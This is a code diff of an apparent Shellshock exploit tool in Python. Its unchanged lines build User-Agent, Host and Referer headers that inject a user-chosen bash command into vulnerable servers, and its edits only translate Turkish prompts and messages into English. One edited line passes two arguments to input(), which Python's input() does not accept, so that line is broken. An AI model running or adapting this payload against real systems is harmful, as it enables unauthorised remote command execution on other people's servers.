@@ -132,7 +132,7 @@ def commandIn():
                     
                     """
                     print(Colors.b,x)
-                    secim =input("seciminiz:")
+                    secim =input(Colors.y,"Choose:")
                     headers = {"User-Agent": "() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
                     host = {"Host":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
                     referer = {"Referer":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
@@ -147,7 +147,7 @@ def commandIn():
                                 "\nEND | URL: {}\n========================================================\n".format(
                                     aaa))
 
-                        print("Yazdırıldı")
+                        print("Result written in file...")
                         with open("response.txt", "r", encoding="utf-8") as f:
                             for i in f:
                                 print(i.replace("\n", ""))
@@ -162,7 +162,7 @@ def commandIn():
                                 "\nEND | URL: {}\n========================================================\n".format(
                                     aaa))
 
-                        print("Yazdırıldı")
+                        print("Result written in file...")
                         with open("response.txt", "r", encoding="utf-8") as f:
                             for i in f:
                                 print(i.replace("\n", ""))
@@ -177,7 +177,7 @@ def commandIn():
                                 "\nEND | URL: {}\n========================================================\n".format(
                                     aaa))
 
-                        print("Yazdırıldı")
+                        print("Result written in file...")
                         with open("response.txt", "r", encoding="utf-8") as f:
                             for i in f:
                                 print(i.replace("\n", ""))
